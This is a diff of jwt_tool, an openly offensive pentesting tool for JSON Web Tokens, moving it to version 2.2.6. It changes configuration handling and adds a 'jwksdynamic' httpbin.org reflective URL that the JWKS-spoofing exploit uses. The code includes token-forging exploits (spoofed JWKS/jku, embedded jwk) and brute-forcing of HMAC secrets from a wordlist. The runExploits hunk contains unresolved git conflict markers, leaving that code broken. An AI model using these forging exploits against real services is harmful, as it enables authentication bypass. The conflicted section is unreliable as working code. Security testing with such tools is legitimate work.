@@ -1,13 +1,13 @@
 #!/usr/bin/env python3
 #
-# JWT_Tool version 2.2.5 (26_01_2022)
+# JWT_Tool version 2.2.6 (09_09_2022)
 # Written by Andy Tyler (@ticarpi)
 # Please use responsibly...
 # Software URL: https://github.com/ticarpi/jwt_tool
 # Web: https://www.ticarpi.com
 # Twitter: @ticarpi
 
-jwttoolvers = "2.2.5"
+jwttoolvers = "2.2.6"
 import ssl
 import sys
 import os
@@ -61,6 +61,16 @@ def createConfig():
     ecprivKeyName = path+"/jwttool_custom_private_EC.pem"
     ecpubkeyName = path+"/jwttool_custom_public_EC.pem"
     jwksName = path+"/jwttool_custom_jwks.json"
+    proxyHost = "127.0.0.1"
+    config = configparser.ConfigParser(allow_no_value=True)
+    config.optionxform = str
+    config['crypto'] = {'pubkey': pubkeyName,
+        'privkey': privKeyName,
+        'ecpubkey': ecpubkeyName,
+        'ecprivkey': ecprivKeyName,
+        'jwks': jwksName}
+    config['customising'] = {'useragent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) jwt_tool',
+        'jwks_kid': 'jwt_tool'}
     if (os.path.isfile(privKeyName)) and (os.path.isfile(pubkeyName)) and (os.path.isfile(ecprivKeyName)) and (os.path.isfile(ecpubkeyName)) and (os.path.isfile(jwksName)):
         cprintc("Found existing Public and Private Keys - using these...", "cyan")
         origjwks = open(jwksName, "r").read()
@@ -88,23 +98,14 @@ def createConfig():
         fulljwks = json.dumps(jwksout,separators=(",",":"), indent=4)
         with open(jwksName, 'w') as test_jwks_out:
                 test_jwks_out.write(fulljwks)
-        jwks_b64 = base64.b64encode(fulljwks.encode('ascii'))
-    proxyHost = "127.0.0.1"
-    config = configparser.ConfigParser(allow_no_value=True)
-    config.optionxform = str
-    config['crypto'] = {'pubkey': pubkeyName,
-        'privkey': privKeyName,
-        'ecpubkey': ecpubkeyName,
-        'ecprivkey': ecprivKeyName,
-        'jwks': jwksName}
+        jwks_b64 = base64.urlsafe_b64encode(fulljwks.encode('ascii'))
     config['services'] = {'jwt_tool_version': jwttoolvers,
         '# To disable the proxy option set this value to: False (no quotes). For Docker installations with a Windows host OS set this to: "host.docker.internal:8080"': None, 'proxy': proxyHost+':8080',
         '# To disable following redirects set this value to: False (no quotes)': None, 'redir': 'True',
         '# Set this to the URL you are hosting your custom JWKS file (jwttool_custom_jwks.json) - your own server, or maybe use this cheeky reflective URL (https://httpbin.org/base64/{base64-encoded_JWKS_here})': None,
-        'jwksloc': 'https://httpbin.org/base64/'+jwks_b64.decode(),
+        'jwksloc': '',
+        'jwksdynamic': 'https://httpbin.org/base64/'+jwks_b64.decode(),
         '# Set this to the base URL of a Collaborator server, somewhere you can read live logs, a Request Bin etc.': None, 'httplistener': ''}
-    config['customising'] = {'useragent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) jwt_tool',
-        'jwks_kid': 'jwt_tool'}
     config['input'] = {'wordlist': 'jwt-common.txt',
         'commonHeaders': 'common-headers.txt',
         'commonPayloads': 'common-payloads.txt'}
@@ -533,7 +534,7 @@ def signingToken(newheadDict, newpaylDict):
 def checkSig(sig, contents, key):
     quiet = False
     if key == "":
-        cprintc("Type in the key to test", white)
+        cprintc("Type in the key to test", "white")
         key = input("> ")
     testKey(key.encode(), sig, contents, headDict, quiet)
 
@@ -773,7 +774,7 @@ def jwksEmbed(newheadDict, newpaylDict):
     new_key = RSA.importKey(pubKey)
     n = base64.urlsafe_b64encode(new_key.n.to_bytes(256, byteorder='big'))
     e = base64.urlsafe_b64encode(new_key.e.to_bytes(3, byteorder='big'))
-    newjwks = buildJWKS(n, e, "jwt_tool")
+    newjwks = buildJWKS(n, e, config['customising']['jwks_kid'])
     newHead["jwk"] = newjwks
     newHead["alg"] = "RS256"
     key = privKey
@@ -1432,9 +1433,12 @@ def scanModePlaybook():
         origjku = headDict["jku"]
     except:
         origjku = False
-    jku = config['services']['jwksloc']
+        if config['services']['jwksloc']:
+            jku = config['services']['jwksloc']
+        else:
+            jku = config['services']['jwksdynamic']
     newContents, newSig = exportJWKS(jku)
-    jwtOut(newContents+"."+newSig, "Exploit: Spoof JWKS (-X s)", "Signed with JWKS at "+config['services']['jwksloc'])
+    jwtOut(newContents+"."+newSig, "Exploit: Spoof JWKS (-X s)", "Signed with JWKS at "+jku)
     if origjku:
         headDict["jku"] = origjku
     else:
@@ -1497,7 +1501,7 @@ def scanModePlaybook():
     else:
         cprintc("External service interactions not tested - enter listener URL into 'jwtconf.ini' to try this option", "red")
     # Accept Common HMAC secret (as alterative signature)
-    with open(config['input']['wordlist']) as commonPassList:
+    with open(config['input']['wordlist'], "r", encoding='utf-8', errors='ignore') as commonPassList:
         commonPass = commonPassList.readline().rstrip()
         while commonPass:
             newSig, newContents = signTokenHS(headDict, paylDict, commonPass, 256)
@@ -1739,15 +1743,23 @@ def runExploits():
         elif args.exploit == "s":
             if config['services']['jwksloc']:
                 jku = config['services']['jwksloc']
+<<<<<<< Updated upstream
                 newContents, newSig = exportJWKS(jku)
                 if config['services']['jwksloc'] == args.jwksurl:
                     cprintc("Paste this JWKS into a file at the following location before submitting token request: "+jku+"\n(JWKS file used: "+config['crypto']['jwks']+")\n"+str(config['crypto']['jwks'])+"", "cyan")
                 desc = "Signed with JWKS at "+config['services']['jwksloc']
                 jwtOut(newContents+"."+newSig, "Spoof JWKS", desc)
                 # exit(1)
+=======
+>>>>>>> Stashed changes
             else:
-                cprintc("No URL provided to spoof the JWKS (-u)\n", "red")
-                parser.print_usage()
+                jku = config['services']['jwksdynamic']
+            newContents, newSig = exportJWKS(jku)
+            if config['services']['jwksloc'] and config['services']['jwksloc'] == args.jwksurl:
+                cprintc("Paste this JWKS into a file at the following location before submitting token request: "+jku+"\n(JWKS file used: "+config['crypto']['jwks']+")\n"+str(config['crypto']['jwks'])+"", "cyan")
+            desc = "Signed with JWKS at "+jku
+            jwtOut(newContents+"."+newSig, "Spoof JWKS", desc)
+            parser.print_usage()
             # exit(1)
         elif args.exploit == "k":
             if config['crypto']['pubkey']:
